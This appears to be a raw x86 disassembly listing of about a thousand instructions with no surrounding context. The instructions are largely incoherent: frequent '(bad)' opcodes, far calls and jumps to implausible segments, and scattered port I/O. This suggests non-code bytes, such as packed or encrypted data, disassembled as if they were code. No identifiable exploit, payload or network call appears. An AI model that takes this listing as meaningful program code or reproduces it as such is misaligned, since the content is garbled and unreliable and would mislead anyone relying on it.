  41ac3d:	mov    ch,0x29
  41ac3f:	sub    ebp,DWORD PTR [edi]
  41ac41:	pop    edi
  41ac42:	call   0xbc68:0x7deb119
  41ac49:	xchg   ecx,eax
  41ac4a:	mov    ebp,0x16b5a27
  41ac4f:	inc    edx
  41ac50:	push   ebp
  41ac51:	stos   DWORD PTR es:[edi],eax
  41ac52:	or     ecx,esi
  41ac54:	pop    ebx
  41ac55:	outs   dx,DWORD PTR ds:[esi]
  41ac56:	out    dx,al
  41ac57:	xor    al,0x4f
  41ac59:	or     esp,DWORD PTR [eax+0x7a]
  41ac5c:	shr    BYTE PTR [esi+0x6d],0x8c
  41ac60:	cmp    eax,0xffd09dec
  41ac65:	stos   DWORD PTR es:[edi],eax
  41ac66:	mov    bl,0xda
  41ac68:	rol    DWORD PTR [eax+0x60f4c345],0xe4
  41ac6f:	and    dl,cl
  41ac71:	add    al,0x96
  41ac73:	add    dl,al
  41ac75:	cmp    BYTE PTR [esi+0x2b],0x1
  41ac79:	pop    ecx
  41ac7a:	enter  0xefb7,0x3d
  41ac7e:	es inc ebx
  41ac80:	pop    esi
  41ac81:	jmp    0xcb91:0x7516582b
  41ac88:	dec    edi
  41ac89:	and    DWORD PTR [ecx-0x19ebaa77],edx
  41ac8f:	jne    0x41ac3d
  41ac91:	aas    
  41ac92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac93:	ror    DWORD PTR [eax-0x21],0x23
  41ac97:	in     eax,0x8b
  41ac99:	mov    WORD PTR [ebx],ss
  41ac9b:	lods   eax,DWORD PTR ds:[esi]
  41ac9c:	dec    ebx
  41ac9d:	outs   dx,DWORD PTR ds:[esi]
  41ac9e:	cmp    ah,BYTE PTR [esi+0xf]
  41aca1:	mov    dh,0xb5
  41aca3:	adc    al,0x8d
  41aca5:	into   
  41aca6:	(bad)  
  41aca8:	push   esi
  41aca9:	cmp    ebp,DWORD PTR [esi]
  41acab:	and    DWORD PTR [edx-0xe],0xe440dd6a
  41acb2:	push   eax
  41acb3:	jecxz  0x41ac7c
  41acb5:	adc    cl,ch
  41acb7:	inc    ebp
  41acb8:	inc    edx
  41acb9:	iret   
  41acba:	jl     0x41ac8c
  41acbc:	pushf  
  41acbd:	pop    ebx
  41acbe:	neg    BYTE PTR [edi-0x3a]
  41acc1:	clc    
  41acc2:	jmp    0xe24bbde3
  41acc7:	leave  
  41acc8:	pop    ecx
  41acc9:	repnz repnz mov ah,0x3c
  41accd:	call   0xe0ce:0x7c15f07c
  41acd4:	sub    esi,DWORD PTR [ebp+0x50]
  41acd7:	scas   eax,DWORD PTR es:[edi]
  41acd8:	push   0xf0388f72
  41acdd:	mov    al,0xc7
  41acdf:	add    al,0x47
  41ace1:	fidiv  WORD PTR [esi-0x60]
  41ace4:	pop    ss
  41ace5:	push   ds
  41ace6:	mov    DWORD PTR [edx+edx*4],ebp
  41ace9:	fadd   QWORD PTR [ecx-0x67]
  41acec:	ss retf 0xf94c
  41acf0:	and    dh,dl
  41acf2:	fild   WORD PTR [edi]
  41acf4:	je     0x41ad70
  41acf6:	call   0x2a42554d
  41acfb:	mov    edx,0x6bcb9c3b
  41ad00:	mov    ah,0x1a
  41ad02:	mov    dl,0x92
  41ad04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad05:	aam    0xfe
  41ad07:	cmove  esp,eax
  41ad0a:	scas   al,BYTE PTR es:[edi]
  41ad0b:	rol    ecx,cl
  41ad0d:	div    BYTE PTR [esi+0x1205dd7b]
  41ad13:	mov    DWORD PTR [ebx-0x7ab25dbd],ecx
  41ad19:	sbb    al,0x72
  41ad1b:	add    esi,DWORD PTR [edx+0x27]
  41ad1e:	loopne 0x41aca5
  41ad20:	adc    eax,0xe679ca81
  41ad25:	mov    BYTE PTR [eax-0x1f5d4125],ah
  41ad2b:	lods   eax,DWORD PTR ds:[esi]
  41ad2c:	mov    ebp,0x368ec8c7
  41ad31:	(bad)  
  41ad32:	dec    edi
  41ad33:	inc    ebx
  41ad34:	adc    DWORD PTR [ebx-0x10fa050c],eax
  41ad3a:	ins    BYTE PTR es:[edi],dx
  41ad3b:	leave  
  41ad3c:	nop
  41ad3d:	sbb    al,0x9d
  41ad3f:	push   ecx
  41ad40:	stc    
  41ad41:	sbb    al,0x34
  41ad43:	and    al,0x14
  41ad45:	out    dx,al
  41ad46:	xor    BYTE PTR [ecx+0xc],0x9a
  41ad4a:	pushf  
  41ad4b:	repnz mov edx,0xa33d5fe0
  41ad51:	xchg   ebx,eax
  41ad52:	aad    0x89
  41ad54:	push   eax
  41ad55:	sar    ch,0x44
  41ad58:	adc    ch,0x51
  41ad5b:	out    0x3a,eax
  41ad5d:	pop    edx
  41ad5e:	pop    eax
  41ad5f:	cs and eax,0x53caa2a6
  41ad65:	mov    eax,esp
  41ad67:	inc    ebp
  41ad68:	cmc    
  41ad69:	inc    esi
  41ad6a:	outs   dx,DWORD PTR ds:[esi]
  41ad6b:	sar    esp,1
  41ad6d:	inc    esi
  41ad6e:	lock adc bh,BYTE PTR [esi+0x7f]
  41ad72:	test   eax,0x8bee640
  41ad77:	cmp    eax,0x8f58f087
  41ad7c:	aad    0x89
  41ad7e:	cmp    al,0xb9
  41ad80:	fcomp  QWORD PTR [eax+0x36]
  41ad83:	xlat   BYTE PTR ds:[ebx]
  41ad84:	or     cl,BYTE PTR [edx-0x5f3539a9]
  41ad8a:	mov    cl,0x4f
  41ad8c:	out    0x5d,eax
  41ad8e:	sbb    ah,BYTE PTR [edi+0x1806a96e]
  41ad94:	fcmovne st,st(0)
  41ad96:	repz mov esi,0x76aec4c9
  41ad9c:	outs   dx,BYTE PTR ds:[esi]
  41ad9d:	je     0x41adc8
  41ad9f:	je     0x41adcd
  41ada1:	test   eax,0xac063a94
  41ada6:	ret    0x8719
  41ada9:	cdq    
  41adaa:	jle    0x41ae0e
  41adac:	stos   DWORD PTR es:[edi],eax
  41adad:	mov    ch,0x78
  41adaf:	lock mov ecx,0x57970067
  41adb5:	sub    BYTE PTR [ecx-0x22],ah
  41adb8:	ins    DWORD PTR es:[edi],dx
  41adb9:	ins    DWORD PTR es:[edi],dx
  41adba:	add    ch,al
  41adbc:	mov    cl,0xa7
  41adbe:	call   0xbf5f984f
  41adc3:	jge    0x41ad5f
  41adc5:	cmp    DWORD PTR [ebx],edx
  41adc7:	in     al,0xd
  41adc9:	pushf  
  41adca:	pop    ss
  41adcb:	mov    edi,0x96235c7f
  41add0:	adc    ebx,edi
  41add2:	popf   
  41add3:	sar    DWORD PTR ds:0x8f2fcb8e,0xa7
  41adda:	mov    ebp,DWORD PTR [esp+esi*2+0x39]
  41adde:	jl     0x41add6
  41ade0:	mov    ebp,0xc3feebce
  41ade5:	pop    ss
  41ade6:	or     ch,BYTE PTR [edx-0x7b]
  41ade9:	inc    ebp
  41adea:	mov    ah,BYTE PTR [esi+0xb]
  41aded:	ret    
  41adee:	mov    DWORD PTR [eax-0x761205a7],edi
  41adf4:	clc    
  41adf5:	lea    esi,ds:0x52738d9f
  41adfb:	sbb    esi,edi
  41adfd:	aad    0x25
  41adff:	mov    ah,0x1d
  41ae01:	pop    edx
  41ae02:	cs ret 
  41ae04:	test   eax,0xbf280752
  41ae09:	(bad)  
  41ae0a:	xor    DWORD PTR [ecx-0x13],edx
  41ae0d:	or     eax,0xd4c7fb15
  41ae12:	lahf   
  41ae13:	shr    BYTE PTR ds:[edx-0x7f5e8981],cl
  41ae1a:	dec    ecx
  41ae1b:	add    al,0xc6
  41ae1d:	inc    ecx
  41ae1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae1f:	pop    esp
  41ae20:	xchg   edx,eax
  41ae21:	adc    bh,bl
  41ae23:	or     al,0x8d
  41ae25:	mov    ch,0x11
  41ae27:	adc    DWORD PTR [eax+0x3f1b21f4],esi
  41ae2d:	fist   WORD PTR [eax-0x34]
  41ae30:	(bad)  
  41ae32:	mov    edx,0xa168c3ba
  41ae37:	jge    0x41ae82
  41ae39:	js     0x41ae61
  41ae3b:	loop   0x41ae23
  41ae3d:	mov    edx,0xb58ff486
  41ae42:	inc    eax
  41ae43:	ins    DWORD PTR es:[edi],dx
  41ae44:	add    ecx,ecx
  41ae46:	mov    ecx,DWORD PTR [edx+0x6d]
  41ae49:	xlat   BYTE PTR ds:[ebx]
  41ae4a:	sti    
  41ae4b:	sub    al,0x7c
  41ae4d:	out    dx,al
  41ae4e:	mov    al,0xbc
  41ae50:	mov    dl,0xcd
  41ae52:	pushf  
  41ae53:	fist   WORD PTR [esi]
  41ae55:	ins    BYTE PTR es:[edi],dx
  41ae56:	and    DWORD PTR [esi+0x56164185],ecx
  41ae5c:	and    eax,edx
  41ae5e:	and    al,0x52
  41ae60:	bound  esi,QWORD PTR [ebx-0x37]
  41ae63:	cdq    
  41ae64:	in     al,0x3c
  41ae66:	outs   dx,DWORD PTR ds:[esi]
  41ae67:	dec    ebp
  41ae69:	mov    cl,dh
  41ae6b:	pushf  
  41ae6c:	jl     0x41adfa
  41ae6e:	inc    esi
  41ae6f:	adc    edx,DWORD PTR [esi]
  41ae71:	mov    bl,0xfc
  41ae73:	lods   al,BYTE PTR ds:[esi]
  41ae74:	lock dec edi
  41ae76:	jne    0x41ae79
  41ae78:	iret   
  41ae79:	mov    DWORD PTR ds:0x7e7cbc94,0x9cae6a29
  41ae83:	xchg   ebp,eax
  41ae84:	mov    edi,0xfa97d13f
  41ae89:	ret    0xc23c
  41ae8c:	in     al,0x73
  41ae8e:	call   0xdec85058
  41ae93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae94:	in     eax,dx
  41ae95:	nop
  41ae96:	(bad)  
  41ae97:	pop    ds
  41ae98:	mov    eax,0xe393ce0
  41ae9d:	push   DWORD PTR ds:0xf0e7403d
  41aea3:	dec    ebp
  41aea4:	pushf  
  41aea5:	mov    edx,0x7192e417
  41aeaa:	icebp  
  41aeab:	les    edi,FWORD PTR [ebx-0x1f3f56bf]
  41aeb1:	mov    ebx,edx
  41aeb3:	adc    eax,0xc6c9efe6
  41aeb8:	call   0xeab4dec6
  41aebd:	hlt    
  41aebe:	test   eax,0x445c1c22
  41aec3:	mov    dh,0xeb
  41aec5:	add    ch,ch
  41aec7:	mov    ebp,0x2729cce2
  41aecc:	jl     0x41aeb2
  41aece:	push   0xef28ab42
  41aed3:	adc    DWORD PTR [ebx+0xe163f00],eax
  41aed9:	sti    
  41aeda:	mov    WORD PTR [eax+0x4e],es
  41aedd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aede:	sbb    al,0x40
  41aee0:	jnp    0x41aea5
  41aee2:	add    al,0x39
  41aee4:	sti    
  41aee5:	xor    al,0x82
  41aee7:	xor    esi,ebp
  41aee9:	sbb    BYTE PTR [esi-0x6f],bh
  41aeec:	outs   dx,DWORD PTR ds:[esi]
  41aeed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeee:	es in  al,0x81
  41aef1:	inc    ecx
  41aef2:	lahf   
  41aef3:	pop    ebp
  41aef4:	adc    esi,DWORD PTR [eax+0x23]
  41aef7:	xor    eax,0x5180a301
  41aefc:	in     eax,0x0
  41aefe:	js     0x41af5f
  41af00:	int3   
  41af01:	dec    ebx
  41af02:	add    al,0x51
  41af04:	mov    dl,0x42
  41af06:	clc    
  41af07:	hlt    
  41af08:	jl     0x41aed5
  41af0a:	xor    eax,0xe30e3c9b
  41af0f:	retf   
  41af10:	add    al,0x5b
  41af12:	mov    WORD PTR [eax-0x43],?
  41af15:	lock in eax,dx
  41af17:	jno    0x41af57
  41af19:	add    edx,esi
  41af1b:	out    dx,al
  41af1c:	cld    
  41af1d:	jmp    0x41af71
  41af1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af20:	ins    DWORD PTR es:[edi],dx
  41af21:	call   0xac963e6c
  41af26:	inc    ecx
  41af27:	jns    0x41af4a
  41af29:	jns    0x41aefb
  41af2b:	mov    eax,ds:0x23442ee6
  41af30:	loopne 0x41af99
  41af32:	xchg   ebx,eax
  41af33:	arpl   WORD PTR [ebp+0xa01d5ca],bp
  41af39:	mov    edx,0x4b1bed01
  41af3e:	jle    0x41af1e
  41af40:	or     ch,BYTE PTR [ebp+0x21]
  41af43:	stos   DWORD PTR es:[edi],eax
  41af44:	repnz fwait
  41af46:	call   0xd44d:0x20e41d9a
  41af4d:	sti    
  41af4e:	push   edi
  41af4f:	das    
  41af50:	inc    esi
  41af51:	in     al,dx
  41af52:	outs   dx,DWORD PTR ds:[esi]
  41af53:	fsubr  QWORD PTR ds:0x5442b70
  41af59:	std    
  41af5a:	push   esp
  41af5b:	nop
  41af5c:	mov    edx,0xce805c29
  41af61:	push   ss
  41af62:	das    
  41af63:	enter  0x39a0,0x89
  41af67:	cwde   
  41af68:	cs (bad) 
  41af6a:	xor    DWORD PTR [ecx-0x603f417b],esi
  41af70:	clc    
  41af71:	aad    0x69
  41af73:	lds    ebp,FWORD PTR [edi+0x6d]
  41af76:	cmp    ebp,0x4ca9ee5a
  41af7c:	mov    dh,0xe6
  41af7e:	xchg   edi,eax
  41af7f:	xchg   ebx,eax
  41af80:	das    
  41af81:	(bad)  
  41af82:	push   0xaa8a9bc0
  41af87:	int    0x28
  41af89:	jnp    0x41afb8
  41af8b:	ins    BYTE PTR es:[edi],dx
  41af8c:	stos   DWORD PTR es:[edi],eax
  41af8d:	into   
  41af8e:	xchg   ecx,eax
  41af8f:	push   ebp
  41af90:	scas   al,BYTE PTR es:[edi]
  41af91:	push   esi
  41af92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af93:	xor    al,0x27
  41af95:	iret   
  41af96:	jle    0x41af66
  41af98:	test   al,0x11
  41af9a:	inc    ecx
  41af9b:	fsub   st(6),st
  41af9d:	cmc    
  41af9e:	pop    edi
  41af9f:	mov    bl,0xa9
  41afa1:	xchg   ebx,eax
  41afa2:	nop
  41afa3:	mov    eax,ds:0x96d2f2a1
  41afa8:	jle    0x41b000
  41afaa:	loopne 0x41af93
  41afac:	(bad)  
  41afad:	idiv   DWORD PTR [eax]
  41afaf:	inc    eax
  41afb0:	js     0x41af65
  41afb2:	push   edi
  41afb3:	sub    eax,0xca699833
  41afb8:	retf   
  41afb9:	das    
  41afba:	adc    BYTE PTR [ebx+ebp*1-0x18],dl
  41afbe:	retf   
  41afbf:	popa   
  41afc0:	cli    
  41afc1:	pop    edi
  41afc2:	aad    0xda
  41afc4:	fmulp  st(3),st
  41afc6:	(bad)  
  41afc7:	sbb    ch,BYTE PTR [edx]
  41afc9:	pop    ebp
  41afca:	arpl   WORD PTR [eax],cx
  41afcc:	gs retf 
  41afce:	push   es
  41afcf:	cdq    
  41afd0:	jmp    0xa221ae23
  41afd5:	stos   BYTE PTR es:[edi],al
  41afd6:	mov    ah,0xd2
  41afd8:	inc    edx
  41afd9:	or     BYTE PTR [edx-0x3a],ah
  41afdc:	clc    
  41afdd:	inc    ebx
  41afde:	dec    eax
  41afdf:	cdq    
  41afe0:	les    esp,FWORD PTR [eax]
  41afe2:	outs   dx,DWORD PTR ds:[esi]
  41afe3:	inc    esi
  41afe4:	bound  eax,QWORD PTR [esi+0x367f2cf4]
  41afea:	pop    esi
  41afeb:	jmp    0x6690dbfd
  41aff0:	dec    ecx
  41aff1:	jbe    0x41b04d
  41aff3:	inc    ecx
  41aff4:	inc    eax
  41aff5:	xor    dh,BYTE PTR [esi]
  41aff7:	push   cs
  41aff8:	(bad)  
  41aff9:	rcr    ecx,0xc6
  41affc:	outs   dx,BYTE PTR ds:[esi]
  41affd:	sbb    DWORD PTR [ebx],esi
  41afff:	jge    0x41afa8
  41b001:	or     BYTE PTR [edx+0x57],al
  41b004:	ins    DWORD PTR es:[edi],dx
  41b005:	stc    
  41b006:	rcr    BYTE PTR [ecx],0xab
  41b009:	dec    edx
  41b00a:	test   BYTE PTR [eax],ch
  41b00c:	mov    ?,edi
  41b00e:	leave  
  41b00f:	lahf   
  41b010:	or     al,0xe4
  41b012:	cmp    ebx,esp
  41b014:	pop    ss
  41b015:	in     eax,0xa6
  41b017:	push   esi
  41b018:	xor    dh,BYTE PTR [esp+ebx*4+0x6b8ce26e]
  41b01f:	cld    
  41b020:	jle    0x41afc7
  41b022:	jbe    0x41b011
  41b024:	retf   0xa90e
  41b027:	cmp    al,0x6f
  41b029:	xchg   ecx,eax
  41b02a:	mov    bl,0x62
  41b02c:	dec    ebp
  41b02d:	ss push ebx
  41b02f:	cdq    
  41b030:	adc    edi,eax
  41b032:	rcr    BYTE PTR [ecx+esi*8],cl
  41b035:	push   0xffffffcb
  41b037:	rcr    DWORD PTR [esi+0x5c82a036],0x66
  41b03e:	mov    ds,WORD PTR [ebx+0x55]
  41b041:	out    dx,eax
  41b042:	jmp    0x6098:0xa62ec9a8
  41b049:	mov    WORD PTR [edx+0x1ac26fa1],fs
  41b04f:	ret    0x4936
  41b052:	push   ebp
  41b053:	add    DWORD PTR [edx+0x504fc293],esi
  41b059:	dec    edx
  41b05a:	mov    dl,0x95
  41b05c:	xor    edx,DWORD PTR [ecx+0x65]
  41b05f:	out    0xff,eax
  41b061:	xchg   esi,eax
  41b062:	pop    esi
  41b063:	aad    0x72
  41b065:	add    ebx,DWORD PTR [eax+eiz*8-0x5783348c]
  41b06c:	sbb    ecx,DWORD PTR [ebp-0x7da66bde]
  41b072:	and    al,0x7c
  41b074:	in     al,0xc
  41b076:	jp     0x41b0be
  41b078:	xor    ebp,DWORD PTR [ebp-0x51d0a762]
  41b07e:	sbb    ebx,edx
  41b080:	ss fcmovne st,st(1)
  41b083:	push   ds
  41b084:	xor    eax,DWORD PTR [ecx+ebx*4]
  41b087:	jns    0x41b084
  41b089:	fcomp  QWORD PTR [esp+edx*8]
  41b08c:	sub    dh,dl
  41b08e:	cld    
  41b08f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b090:	mov    ebx,0xd3c2d4f7
  41b095:	cwde   
  41b096:	(bad)  
  41b097:	cld    
  41b098:	xchg   BYTE PTR [esi-0x3969e1bf],ch
  41b09e:	jns    0x41b053
  41b0a0:	dec    edx
  41b0a1:	jb     0x41b0cb
  41b0a3:	loop   0x41b081
  41b0a5:	sub    eax,0xead22950
  41b0aa:	push   dx
  41b0ac:	inc    edi
  41b0ad:	lahf   
  41b0ae:	dec    esi
  41b0af:	out    0x79,eax
  41b0b1:	test   eax,0xe4a9029f
  41b0b6:	in     eax,dx
  41b0b7:	ret    0xa616
  41b0ba:	adc    DWORD PTR [esi+0x15],esi
  41b0bd:	cwde   
  41b0be:	data16 fdivr DWORD PTR [eax]
  41b0c1:	mov    esp,0x314d9fe9
  41b0c6:	push   cs
  41b0c7:	mov    edi,0xecf9a418
  41b0cc:	imul   eax,DWORD PTR [eax+0x30],0xb571ad19
  41b0d3:	push   esp
  41b0d4:	xchg   ebp,eax
  41b0d5:	mov    dl,0xc9
  41b0d7:	dec    ebp
  41b0d8:	add    edx,DWORD PTR [bx+di-0x72]
  41b0dc:	mov    ds,esi
  41b0de:	mov    DWORD PTR [edx+ebx*1-0x72],eax
  41b0e2:	sahf   
  41b0e3:	or     eax,DWORD PTR [edi+0x55]
  41b0e6:	pop    edi
  41b0e7:	fst    QWORD PTR [ecx+0x643bc5f1]
  41b0ed:	jmp    0x7361731a
  41b0f2:	icebp  
  41b0f3:	repz and BYTE PTR [eax+0x2d6854d2],bh
  41b0fa:	pushf  
  41b0fb:	test   al,0x11
  41b0fd:	pop    edi
  41b0fe:	out    dx,al
  41b0ff:	sbb    BYTE PTR [edi+0x6f],dl
  41b102:	gs dec esp
  41b104:	retf   0x9ab3
  41b107:	sar    DWORD PTR [esi+0x67],0xe7
  41b10b:	pushf  
  41b10c:	add    eax,0x3bc67a5e
  41b111:	mov    ah,0x66
  41b113:	mov    bl,0x39
  41b115:	mov    eax,ds:0x4c44d313
  41b11a:	mov    dh,0x3c
  41b11c:	adc    eax,0x6022e67
  41b121:	das    
  41b122:	cmp    eax,ecx
  41b124:	les    edi,FWORD PTR [edi-0x48]
  41b127:	mov    ds:0x1ebc8ff8,eax
  41b12c:	test   eax,0x1cb08921
  41b131:	in     al,dx
  41b132:	inc    ecx
  41b133:	inc    ebx
  41b134:	sbb    eax,0x16f81da0
  41b139:	outs   dx,BYTE PTR ds:[esi]
  41b13a:	loop   0x41b118
  41b13c:	test   al,0xfe
  41b13e:	outs   dx,DWORD PTR ds:[esi]
  41b13f:	jmp    0xdcce:0x68662e11
  41b146:	out    dx,al
  41b147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b148:	xor    BYTE PTR [esi],dl
  41b14a:	mov    ah,0x20
  41b14c:	dec    ebx
  41b14d:	xor    eax,0xf9fcf48c
  41b152:	or     DWORD PTR [ecx+0x2d],0xf08256ec
  41b159:	sub    BYTE PTR [ebp-0x5182c954],0xd4
  41b160:	rol    esp,cl
  41b162:	cmp    ecx,ebp
  41b164:	test   al,0x73
  41b166:	arpl   WORD PTR [ecx],cx
  41b168:	cmp    eax,0x3a9a9f
  41b16d:	(bad)  
  41b16e:	not    DWORD PTR [esi-0x30]
  41b171:	pop    ss
  41b172:	xchg   ebx,eax
  41b173:	into   
  41b174:	mov    ecx,DWORD PTR ds:0xc8e221d3
  41b17a:	xchg   ecx,eax
  41b17b:	loope  0x41b147
  41b17d:	cld    
  41b17e:	xor    eax,0x88899228
  41b183:	inc    eax
  41b184:	outs   dx,DWORD PTR ds:[esi]
  41b185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b186:	sbb    BYTE PTR [esi],0x49
  41b189:	jecxz  0x41b18c
  41b18b:	dec    esp
  41b18c:	(bad)  
  41b18d:	or     eax,DWORD PTR [ebp-0x42]
  41b190:	jmp    FWORD PTR [ebp+0x2f]
  41b193:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b194:	push   ecx
  41b195:	fmul   DWORD PTR ds:0x378aabff
  41b19b:	add    edx,DWORD PTR [edx+eax*8+0x1e36ca01]
  41b1a2:	jmp    0x2315:0x46c222d3
  41b1a9:	or     DWORD PTR [edi-0x3aab30d4],ecx
  41b1af:	inc    ebp
  41b1b0:	(bad)  
  41b1b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1b2:	addr16 sbb esi,ebp
  41b1b5:	mov    bl,0xdd
  41b1b7:	push   es
  41b1b8:	jecxz  0x41b236
  41b1ba:	scas   eax,DWORD PTR es:[edi]
  41b1bb:	es adc al,0xba
  41b1be:	cld    
  41b1bf:	cmc    
  41b1c0:	int    0xb0
  41b1c2:	or     al,BYTE PTR [eax+0x20]
  41b1c5:	mov    edi,0xa7dc35d2
  41b1ca:	sbb    BYTE PTR [ebx-0x1fbab80e],ch
  41b1d0:	and    al,0x5e
  41b1d2:	pusha  
  41b1d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1d4:	mov    cl,0x80
  41b1d6:	mov    BYTE PTR [ecx+0x72b5aec3],cl
  41b1dc:	stc    
  41b1dd:	pop    edx
  41b1de:	mov    BYTE PTR [ecx+0x53],bh
  41b1e1:	mov    al,ds:0x5856bec4
  41b1e6:	stos   DWORD PTR es:[edi],eax
  41b1e7:	pusha  
  41b1e8:	iret   
  41b1e9:	fnstcw WORD PTR [ecx-0x76]
  41b1ec:	out    dx,al
  41b1ed:	shr    esi,0xd0
  41b1f0:	rcr    ch,cl
  41b1f2:	push   ecx
  41b1f3:	fnsave [ebp-0x7411c985]
  41b1f9:	mov    bh,0xc5
  41b1fb:	push   ds
  41b1fc:	xchg   ebp,eax
  41b1fd:	inc    ebp
  41b1fe:	ror    BYTE PTR [ecx+0x749a1076],1
  41b204:	xchg   ebx,eax
  41b205:	lods   al,BYTE PTR ds:[esi]
  41b206:	inc    edx
  41b207:	ins    DWORD PTR es:[edi],dx
  41b208:	call   0x2ad4:0x8b0650f9
  41b20f:	pop    esp
  41b210:	inc    edx
  41b211:	jl     0x41b1f8
  41b213:	add    BYTE PTR [ebx],dh
  41b215:	int    0x9d
  41b217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b218:	jecxz  0x41b20f
  41b21a:	loop   0x41b291
  41b21c:	in     al,0x33
  41b21e:	adc    BYTE PTR [ebx-0xfa50d1f],ah
  41b224:	or     ebp,edi
  41b226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b227:	shl    DWORD PTR [ebp-0x5654a38d],1
  41b22d:	jle    0x41b278
  41b22f:	add    ch,al
  41b231:	fiadd  WORD PTR [ebp-0x20a90745]
  41b237:	fadd   QWORD PTR [ebx+0x63]
  41b23a:	adc    bh,BYTE PTR [ebx-0x49]
  41b23d:	jmp    0x1f7d:0x2729066c
  41b244:	jno    0x41b247
  41b246:	push   edx
  41b247:	jg     0x41b20f
  41b249:	outs   dx,DWORD PTR ds:[esi]
  41b24a:	xchg   esi,eax
  41b24b:	pop    esp
  41b24c:	sbb    eax,0xfb0740d7
  41b251:	(bad)  
  41b252:	in     eax,dx
  41b253:	fcom   DWORD PTR [esi+0x3058bd9d]
  41b259:	cwde   
  41b25a:	mov    al,ds:0x6af1a396
  41b25f:	mov    dh,0xcb
  41b261:	mov    bl,0xa1
  41b263:	mov    bh,0xe
  41b265:	test   eax,0x98b2055b
  41b26b:	mov    cl,0x1a
  41b26d:	add    BYTE PTR [ebp-0x1b],cl
  41b270:	or     ecx,DWORD PTR [esi+0x7ab3ff62]
  41b276:	jge    0x41b28c
  41b278:	cli    
  41b279:	imul   ecx,esp,0xc1b7f29a
  41b27f:	cmc    
  41b280:	push   cs
  41b281:	or     eax,0x7a7fccb3
  41b286:	in     al,dx
  41b287:	mov    bh,0xba
  41b289:	pop    edi
  41b28a:	(bad)  
  41b28b:	out    0x7,al
  41b28d:	(bad)  
  41b28e:	std    
  41b28f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b290:	mov    bh,0x61
  41b292:	fs js  0x41b2de
  41b295:	fwait
  41b296:	aad    0xa1
  41b298:	sahf   
  41b299:	mov    edi,DWORD PTR [ecx+0x34]
  41b29c:	mov    WORD PTR [ecx+0x3c],cs
  41b29f:	(bad)  
  41b2a0:	dec    edi
  41b2a1:	pop    edx
  41b2a2:	sub    DWORD PTR [ebx],esi
  41b2a4:	push   ecx
  41b2a5:	xchg   esp,eax
  41b2a6:	inc    eax
  41b2a7:	(bad)  
  41b2a8:	dec    ebx
  41b2a9:	lods   al,BYTE PTR ds:[esi]
  41b2aa:	mov    al,0x7
  41b2ac:	scas   eax,DWORD PTR es:[edi]
  41b2ad:	xchg   edi,eax
  41b2ae:	mov    ah,0x24
  41b2b0:	test   BYTE PTR [eax+0x56],dh
  41b2b3:	mov    eax,ds:0x2bb37793
  41b2b8:	xor    BYTE PTR [edi-0xb18101],al
  41b2be:	xchg   esi,eax
  41b2bf:	push   edi
  41b2c0:	jns    0x41b25f
  41b2c2:	mov    bl,0xfd
  41b2c4:	xchg   esp,eax
  41b2c5:	mov    eax,ds:0x1275c19
  41b2ca:	mov    al,0x8f
  41b2cc:	iret   
  41b2cd:	mov    esp,0x362b5e6d
  41b2d2:	out    dx,eax
  41b2d3:	and    edx,ecx
  41b2d5:	cmp    BYTE PTR [ebx-0x5e],bh
  41b2d8:	pop    ebp
  41b2d9:	imul   esi,DWORD PTR [eax+0x27],0xb0371934
  41b2e0:	dec    edi
  41b2e1:	inc    eax
  41b2e2:	outs   dx,DWORD PTR ds:[esi]
  41b2e3:	add    DWORD PTR [esi],ebp
  41b2e5:	mov    ebp,0x7c05fce0
  41b2ea:	(bad)  
  41b2ec:	inc    ecx
  41b2ed:	jle    0x41b32a
  41b2ef:	not    DWORD PTR [ecx]
  41b2f1:	out    0xd0,eax
  41b2f3:	push   esp
  41b2f4:	pop    ebp
  41b2f5:	lods   eax,DWORD PTR ds:[esi]
  41b2f6:	adc    ch,BYTE PTR [ecx+0x2016aa96]
  41b2fc:	out    0x44,al
  41b2fe:	inc    esp
  41b2ff:	push   0xadc5457b
  41b304:	jnp    0x41b2a9
  41b306:	je     0x41b37d
  41b308:	mov    esi,0x8b9e8f4
  41b30d:	sub    dh,0x2a
  41b310:	jmp    0x41b2fd
  41b312:	ins    DWORD PTR es:[edi],dx
  41b313:	ins    DWORD PTR es:[edi],dx
  41b314:	rol    BYTE PTR [ecx+0x191de77a],cl
  41b31a:	fmul   DWORD PTR [edx+0x6830a5cb]
  41b320:	stos   DWORD PTR es:[edi],eax
  41b321:	and    eax,0xe5937dd2
  41b326:	neg    BYTE PTR [edi+0x15]
  41b329:	mov    eax,ds:0x312ebf1a
  41b32e:	or     eax,ebp
  41b330:	or     al,0x66
  41b332:	mov    ds,WORD PTR [eax-0xf]
  41b335:	and    eax,0x1c4c189
  41b33a:	and    DWORD PTR [esi],edx
  41b33c:	aad    0xde
  41b33e:	in     eax,dx
  41b33f:	push   eax
  41b340:	rol    ebp,cl
  41b342:	push   edx
  41b343:	jne    0x41b31e
  41b345:	or     al,0x28
  41b347:	call   0x82be:0xa029a9f3
  41b34e:	aam    0x5f
  41b350:	sbb    al,0x84
  41b352:	ficom  DWORD PTR [edi+0x77]
  41b355:	push   ebp
  41b356:	gs pop edx
  41b358:	or     BYTE PTR [edi+eax*1-0x7f],cl
  41b35c:	or     DWORD PTR [esp+eiz*2-0xa],edi
  41b360:	or     dh,dh
  41b362:	jecxz  0x41b32e
  41b364:	rcl    BYTE PTR [edx+ecx*2-0x61],1
  41b368:	and    al,0xf1
  41b36a:	mov    edx,0x4d5c957a
  41b36f:	gs stos DWORD PTR es:[edi],eax
  41b371:	mov    eax,edx
  41b373:	aaa    
  41b374:	in     eax,0x9a
